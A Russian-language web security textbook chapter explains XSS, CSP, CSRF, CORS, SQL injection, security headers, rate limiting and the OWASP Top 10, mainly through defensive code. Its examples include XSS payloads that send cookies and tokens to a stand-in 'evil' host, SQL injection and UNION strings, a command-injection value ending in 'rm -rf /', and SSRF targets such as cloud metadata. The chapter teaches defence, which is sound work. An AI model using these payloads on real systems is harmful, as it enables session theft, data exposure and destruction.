---
title: "Веб-безопасность: XSS, CSRF, CORS, SQL-инъекции и OWASP Top 10"
description: "Три вида XSS и CSP директива за директивой, CSRF-токены и SameSite, CORS и preflight, SQL-инъекции с примерами обхода, security headers через Helmet, rate limiting, mass assignment и разбор OWASP Top 10."
---

В краткой версии ты получил чек-лист: Helmet, Zod, параметризованные запросы, rate limit. Чек-лист хорош как стартовая линия обороны, но плох как понимание: на собеседовании спросят «почему CSP закрывает XSS, если есть DOM-based инъекция», а пентестер найдёт CORS-конфиг, который ты считал безопасным. Эта глава — разбор механики атак и защит: что именно происходит в браузере, где граница ответственности фронтенда и бэкенда, и как каждая защита ломается, если её поставить неправильно.

## XSS: три вида одной болезни

XSS — исполнение чужого JavaScript в контексте твоей страницы. Различают три пути, которым инъекция попадает в DOM.

**Отражённая (reflected).** Зловредный скрипт в URL/параметре отражается сервером в ответе немедленно:

```text
https://app.example.com/search?q=<script>fetch('//evil/'+document.cookie)</script>
```

Работает, если сервер вставляет `q` в HTML без экранирования. Классическая дыра шаблонизаторов эпохи серверного рендеринга.

**Хранимая (stored).** Скрипт сохраняется в базе (комментарий, имя пользователя, описание товара) и выполняется у каждого, кто откроет страницу. Самая опасная разновидность: жертва ничего «не делала», просто смотрела контент, а XSS сидит у него в сессии.

**DOM-based.** Уязвимость целиком на клиенте: JS читает `location.hash`/`document.referrer` и пишет в DOM через `innerHTML`:

```ts
// ДЫРА: document.write(location.hash) или:
el.innerHTML = `<p>Результат: ${new URLSearchParams(location.search).get('q')}</p>`;
// payload: ?q=<img src=x onerror=fetch('//evil/'+localStorage.token)>
```

React/Vue экранируют текстовые интерполяции по умолчанию, но три двери остаются открытыми: `dangerouslySetInnerHTML` без санитайзера, `javascript:` в href из пользовательских данных, ручной `innerHTML`. Лечение — санитайзер (`DOMPurify.sanitize(html)`) и запрет на инлайн-обработчики через CSP.

:::caution[XSS в 2026-м — это не только <script>]
Payload обходят фильтры через `<img src=x onerror=...>`, `<svg onload=...>`, `onfocus` + автoфокус. Фильтровать «плохие теги» списком — проигрышная гонка. Единственный надёжный путь: экранирование по контексту (HTML-текст, атрибут, JS-строка — разные правила) плюс CSP, режущий исполнение чужого кода.
:::

## CSP: Content Security Policy

CSP — заголовок, в котором сервер объявляет, откуда разрешено брать и исполнять ресурсы. Браузер исполняет только то, что подходит под политику, остальное блокирует с записью в консоль.

```ts
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],            // по умолчанию — только свой origin
      scriptSrc: ["'self'", 'https://cdn.trusted.com'],
      styleSrc: ["'self'", "'unsafe-inline'"], // инлайн-стили: мириться или убрать
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.example.com'], // куда ходит fetch/XHR
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],             // <object>/<embed> — никогда
      frameAncestors: ["'none'"],        // кликджекинг: никто не встроит страницу
      upgradeInsecureRequests: [],       // http→https автоматически
    },
  }),
);
```

Ключевые директивы: `script-src` — главная защита от XSS (без `'unsafe-inline'` инлайн-скрипты не исполнятся, XSS через `onerror` тоже режется, если нет `'unsafe-eval'`); `connect-src` — куда может стучаться `fetch` (украденный токен не уйдёт на чужой домен); `frame-ancestors` — аналог `X-Frame-Options`, против кликджекинга; `report-uri`/`report-to` — браузер шлёт нарушения политики, подключи для режима `Content-Security-Policy-Report-Only` перед боевым включением.

:::tip[Nonce вместо unsafe-inline]
Если нужен инлайн-скрипт — генерируй per-запрос nonce (`crypto.randomBytes(16)`) и разрешай `'nonce-...'`. Ниже покажем Trusted Types — следующий уровень.
:::

**Trusted Types (кратко)** — браузерный API, запрещающий опасные DOM-операции со строками: с `require-trusted-types-for 'script'` присвоение `el.innerHTML = string` падает с TypeError. Вместо строк используются объекты `TrustedHTML`, создаваемые санитайзером политики:

```ts
// регистрация политики: всё, что проходит через createHTML — санитизировано
if (window.trustedTypes) {
  trustedTypes.createPolicy('default', {
    createHTML: (s) => DOMPurify.sanitize(s, { RETURN_TRUSTED_TYPE: false }),
  });
}
```

CSP + Trusted Types — единственная защита, которая не зависит от того, не забыл ли разработчик экранировать очередную строку.

## CSRF: когда браузер работает против пользователя

CSRF (межсайтовая подделка запроса): залогиненный пользователь открывает чужую страницу, а та шлёт форму или fetch на `bank.com/transfer` — браузер сам подставляет auth-cookie. Три слоя защиты.

**SameSite cookie.** `SameSite=Lax` — куки не уходят с чужого сайта в фоне (а в Lax — и с top-level POST). Закрывает большинство атак без единой строчки кода. Ограничение: с `SameSite=None` (кросс-сайтовые embed/SPA-флоу) защиты нет.

**Синхронизатор-токен (synchronizer token).** Сервер кладет в сессию случайный токен, вставляет его в каждую форму/заголовок (`X-CSRF-Token`), а на изменяющих запросах сверяет. Чужой сайт токен не знает — запрос отклонён.

**Проверка Origin/Referer.** Для API дешевле всего: изменяющие запросы принимать только если заголовок `Origin` совпадает с доверенным списком. Браузер не даст чужому origin подделать этот заголовок в межсайтовом запросе.

```ts
app.post('/api/transfer', (req, res, next) => {
  const origin = req.headers.origin;
  if (!origin || !ALLOWED_ORIGINS.includes(origin)) return res.sendStatus(403);
  next();
});
```

:::note[Bearer-токены иммунны]
Если аутентификация по заголовку `Authorization: Bearer ...`, который JS ставит вручную, — браузер ничего «автоматически» не подставляет, и классический CSRF не работает. Проблема рождается именно из cookie-авторизации. Это важно для выбора схемы хранения токенов из главы [Аутентификация](/fullstack-devops-textbook/09-security-testing/auth-jwt-oauth/).
:::

## CORS: что это на самом деле

CORS — не «защита сервера», а правило для браузера: JS со страницы origin A не может читать ответы с origin B, если B это не разрешил. Атакующий curl'ом обойдёт CORS свободно — защищается пользователь от чужого сайта, действующего от его сессии.

Простые GET без кастомных заголовков уходят сразу; всё остальное (POST с JSON, `Authorization`, `Content-Type: application/json`) требует **preflight** — OPTIONS-запрос с `Access-Control-Request-*`, на который сервер отвечает разрешениями:

```ts
import cors from 'cors';

const ALLOWED = ['https://app.example.com', 'https://admin.example.com'];

app.use(cors({
  origin: (origin, cb) => {
    // origin === undefined — это небраузерный клиент (curl, сервис-сервис): решай сам
    if (!origin || ALLOWED.includes(origin)) return cb(null, true);
    return cb(new Error('CORS: origin not allowed'));
  },
  credentials: true, // разрешить cookie — иначе фронт не авторизуется
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  maxAge: 86400, // кэш preflight на сутки — меньше лишних OPTIONS
}));
```

Типовые ошибки: `origin: '*'` с `credentials: true` — браузер отклонит (и хорошо); `Access-Control-Allow-Origin` с отражением любого origin + credentials — критическая дыра, чужой сайт получает сессионные данные; preflight-кэш без `maxAge` — лишний OPTIONS на каждый запрос; разрешение `Access-Control-Allow-Headers: *` с credentials — снова браузер отклонит.

## SQL-инъекции и почему фильтрация не работает

Инъекция — пользовательский ввод, попавший в SQL как код:

```ts
// ДЫРА: SELECT * FROM users WHERE email = '${email}'
// email = "' OR '1'='1' --"  →  WHERE email = '' OR '1'='1' --'
// строка комментария съедает хвост, условие всегда истинно — все пользователи

// обход «фильтра кавычек»: UNION-атака
// email = "' UNION SELECT id, email, password_hash FROM users --"
```

Фильтровать кавычки бессмысленно — кодировки, экранирование бэкслешами, второго порядка инъекции обходят фильтры годами. Единственное лекарство — **параметризованные запросы**, где ввод никогда не интерпретируется как SQL:

```ts
// pg — $1, $2 — плейсхолдеры, значения передаются отдельно от текста запроса
const { rows } = await db.query('SELECT * FROM users WHERE email = $1', [email]);

// Prisma/Drizzle параметризуют всё по умолчанию
const user = await prisma.user.findUnique({ where: { email } });
```

:::caution[ORM не страхует полностью]
Опасны `$queryRaw` со склейкой строк, `raw()` с шаблонными строками и динамические ORDER BY (`ORDER BY ${sort}`). Для сортировки — белый список колонок: `const col = { date: 'created_at', price: 'price' }[sort] ?? 'created_at'`.
:::

## Security headers через Helmet

`helmet()` подключает набор заголовков, разберём каждый:

| Заголовок | Что делает | Типичное значение |
|---|---|---|
| `Content-Security-Policy` | Белый список источников скриптов/стилей/картинок | см. выше |
| `Strict-Transport-Security` | Браузер ходит только по HTTPS, N дней | `max-age=63072000; includeSubDomains; preload` |
| `X-Content-Type-Options` | Запрет угадывать MIME (защита от MIME-sniffing) | `nosniff` |
| `X-Frame-Options` | Запрет встраивания в iframe (кликджекинг) | `DENY` |
| `Referrer-Policy` | Сколько referrer-а уходит по внешним ссылкам | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Отключение webcam/geolocation/интерес-cohort API | `camera=(), geolocation=(), interest-cohort=()` |
| `Cross-Origin-Opener-Policy` | Изоляция вкладки от opener (Spectre/утечки window) | `same-origin` |
| `Cross-Origin-Resource-Policy` | Кто может встраивать ресурсы | `same-origin` |

HSTS особо: ставится один раз и действует годами; после `preload` попадёшь в список браузеров, и откат на HTTP станет почти невозможен. Подключай только когда HTTPS на 100% настроен.

## Rate limiting: стратегии

Цели разные — и лимиты разные:

- **Глобальный per IP**: 100–300 запросов/мин — от скриптов-«пылесосов» и случайных флудов.
- **Чувствительные эндпоинты**: `/login`, `/password-reset`, `/otp` — 5–10 попыток/мин/IP и отдельно per аккаунт (иначе атакующий брутфорсит чужой аккаунт с тысяч IP).
- **По токену/API-ключу**: для API с планами тарификации.

```ts
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';

const loginLimiter = rateLimit({
  store: new RedisStore({ client: redis, prefix: 'rl:login:' }), // общее для всех инстансов!
  windowMs: 60_000,
  limit: 5,
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  skipSuccessfulRequests: true, // считаем только неудачные попытки
  message: { error: 'Слишком много попыток, подожди минуту' },
});
app.use('/auth/login', loginLimiter);
```

Важно: лимит в памяти процесса бесполезен за балансировщиком (N подов = N × лимит). Храни счётчики в Redis. Для распределённых атак — `slow down` вместо жёсткого бана: прогрессивная задержка снижает ущерб и не ломает легитимных пользователей за NAT.

## Mass assignment

Привязка body к модели целиком позволяет подсунуть лишнее поле:

```ts
// ДЫРА: req.body = { email, password, role: 'admin', isVerified: true }
const user = await prisma.user.create({ data: req.body });

// ПРАВИЛЬНО: явный whitelist
const dto = z.object({
  email: z.string().email(),
  password: z.string().min(8),
}).parse(req.body);
const user = await prisma.user.create({ data: dto });
```

Исторический баг GitHub (2012): добавление `public_key` в форму репозитория давало чужой доступ. Лечение — Zod/class-validator на границе, никогда `data: req.body` целиком.

## OWASP Top 10: разбор по пунктам

1. **A01 Broken Access Control.** Доступ решается на сервере каждый раз: пользователь с `id=7` не может читать `/orders/8` чужого владельца. Типовые дыры: id из URL без проверки владения, `role=admin` из body, отключённый middleware на новом роуте. Тест: на каждый эндпоинт — «чужой пользователь, чужой ресурс».
2. **A02 Cryptographic Failures.** Данные в движении (TLS 1.2+) и в покое (шифрование дисков, бэкапов) + правильные алгоритмы (Argon2id для паролей, AES-GCM для данных). Антипример: кредитки в логах, пароли в MD5.
3. **A03 Injection.** SQL, NoSQL (`{ $where: "this.password == ..." }`), шаблонные инъекции (SSTI в шаблонизаторах), command injection (`exec('convert ' + filename)` → `file.jpg; rm -rf /`). Лечение: параметризация + валидация границ.
4. **A04 Insecure Design.** Уязвимость архитектуры, которую не пофиксить патчем: отсутствие лимитов на восстановление пароля, возможность перебрать промокоды, отсутствие подтверждения критичных операций. Лечение — threat modeling до кода.
5. **A05 Security Misconfiguration.** Debug-режим в проде, дефолтные пароли (`admin/admin`), открытые S3-бакеты, verbose ошибки со стектрейсом, лишние HTTP-методы (OPTIONS показывает всё). Лечение: hardening-чеклисты и сканеры (ZAP).
6. **A06 Vulnerable and Outdated Components.** `npm audit`, Dependabot/Renovate, SBOM. Log4Shell показал: одна устаревшая зависимость внутри зависимости = компрометация.
7. **A07 Identification and Authentication Failures.** Брутфорс без лимитов, слабые парольные политики (только «минимум 8» — нормально; «обязательно символ» — нет), сессии без ротации после логина, JWT без expiry. См. главу [Аутентификация](/fullstack-devops-textbook/09-security-testing/auth-jwt-oauth/).
8. **A08 Software and Data Integrity Failures.** Доставка кода/данных без проверки целостности: CI без подписанных артефактов, десериализация недоверенных данных (`JSON.parse` на blob с функциями), обновления прошивки без подписи. Лечение: подписи, checksums, принцип недоверия к input.
9. **A09 Security Logging and Monitoring Failures.** Атака три недели не замечена, потому что логов нет или их не читает. Логируй аутентификации, изменения прав, ошибки авторизации; следи за алертами (глава про наблюдаемость).
10. **A10 SSRF.** Сервер дёргает URL из пользовательского ввода (`?url=` предпросмотра ссылки) — атакующий стучится во внутреннюю сеть (`http://169.254.169.254/latest/meta-data/` у облака, `http://localhost:6379/` к Redis). Лечение: whitelist доменов, запрет IP-литералов и приватных диапазонов, выделенный egress-прокси.

## Секреты и минимальные привилегии

Секрет в git — это секрет в публичном доступе (сканеры боты находят коммиты за минуты). Правила:

```bash
# .gitignore — первый коммит репозитория
echo ".env\n*.pem\nsecrets/" >> .gitignore

# локально — с правами только для владельца
chmod 600 .env
```

В коде — никогда: используй `process.env.JWT_SECRET` через валидацию на старте (zod-скима env, падает при отсутствии ключевых переменных). В CI — менеджеры секретов (GitHub Encrypted Secrets, Vault). Утёкший секрет = ротация немедленно, «ну мы его потом удалим» не работает — история git помнит всё, нужен force-rewrite (gitleaks + BFG).

**Принцип минимальных привилегий**: сервисный аккаунт БД умеет только то, что нужно (не `SUPERUSER` у API-приложения), IAM-роли узкие, scope OAuth-токена — минимальный (`read` вместо `read write delete`), доступ к прод-данным — через read-only реплику и с логированием. Расширить права легко, сузить после инцидента — больно.

## Типичные ошибки и грабли

1. **CSP с `'unsafe-inline'` в `script-src`.** Формально CSP есть, фактически XSS беспрепятственен. Убирай инлайн — nonce или внешние файлы.
2. **`cors({ origin: true })` — отражение любого Origin.** С credentials это отдаёт чужому сайту данные пользователя. Всегда белый список.
3. **Rate limit в памяти за балансировщиком.** Каждый под считает свой лимит — реальный лимит ×N. Redis store обязателен.
4. **Проверка CSRF только на POST, но не на PUT/DELETE.** Любой изменяющий метод без SameSite/Origin-проверки — дыра.
5. **`data: req.body` в ORM.** Mass assignment: один лишний ключ в JSON и пользователь — админ. Whitelist через Zod на каждом входе.
6. **Утечка секрета «временно, для дебага».** Ключ в коде живёт годами через рефакторинги. Нашёл — ротируй, удаление строки недостаточно.

## Вопросы на собеседовании

1. **Чем отражённая XSS отличается от stored и DOM-based?** Отражённая — payload в URL, отражается сервером сразу; stored — сохраняется в БД и бьёт всех посетителей; DOM-based — уязвимость в клиентском JS, сервер чист. Защита общая: экранирование + CSP, но DOM-based ловится только CSP/Trusted Types.
2. **Как CSP защищает от XSS и где слабое место?** `script-src` без `'unsafe-inline'` запрещает инлайн-скрипты и обработчики. Слабое место: `'unsafe-inline'`, широкие wildcard-домены с JSONP, и `unsafe-eval`.
3. **Зачем CSRF-токен, если есть SameSite=Lax?** SameSite=Lax не защищает при `SameSite=None` (кросс-сайтовые embed), GET-топ-навигации с сайта-посредника и старых клиентах. Токен/Origin-проверка — независимый второй слой.
4. **Что происходит при CORS-preflight и как его кэшировать?** Браузер шлёт OPTIONS с `Access-Control-Request-Method/Headers`; сервер отвечает разрешениями. Кэш — `Access-Control-Max-Age` на длительный срок.
5. **Почему фильтрация кавычек не защищает от SQL-инъекций?** Кодировки, экранирование, UNICODE-обходы, инъекции второго порядка. Параметризация делает ввод данными, а не кодом — по определению неуязвимо.
6. **Что такое mass assignment и как лечится?** Привязка всего body к модели: пользователь подсовывает привилегированные поля. Лечение — явный whitelist валидации (Zod) на границе.
7. **HSTS: зачем и в чём риск?** Принудительный HTTPS на годы вперёд. Риск: включить до полной настройки HTTPS — сайт станет недоступен по HTTP навсегда (с preload).

## Практика

1. Подними CSP через Helmet с `default-src 'self'`, `object-src 'none'`, `frame-ancestors 'none'` в режиме Report-Only на неделю; собери нарушения, поправь скрипты и переведи в боевой режим. Критерий: консоль чистая, отчёт о нарушениях пустой.
2. Напиши интеграционные тесты-доказательства: SQL-инъекция через email не срабатывает; `role: admin` в body регистрации игнорируется; запрос с чужим Origin и credentials отклонён; `Origin: https://evil.com` на POST отклонён с 403.
3. Настрой rate limiting в Redis: 5 попыток/мин на `/auth/login` per IP + 10 попыток/мин per аккаунт. Проверь двумя curl-циклами, что оба лимита работают независимо.
4. Подключи Helmet и пройди `securityheaders.com` до оценки A; разбери каждый заголовок в конфиге комментарием.
5. Пронаблюдай SSRF руками: подними тестовый эндпоинт `?url=` с fetch и добейся чтения `http://127.0.0.1:PORT/` внутреннего сервиса; затем закрой whitelist'ом доменов и блокировкой приватных диапазонов.

## Что почитать

- [OWASP Top 10 (2021)](https://owasp.org/Top10/) — разбор каждого пункта с примерами
- [Content Security Policy — MDN](https://developer.mozilla.org/ru/docs/Web/HTTP/CSP) и [Trusted Types](https://web.dev/articles/trusted-types)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [CORS for Developers — W3C](https://www.w3.org/TR/cors/)
- [Helmet.js — документация по каждому заголовку](https://helmetjs.github.io/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — бесплатные лаборатории по XSS/SQLi/CSRF
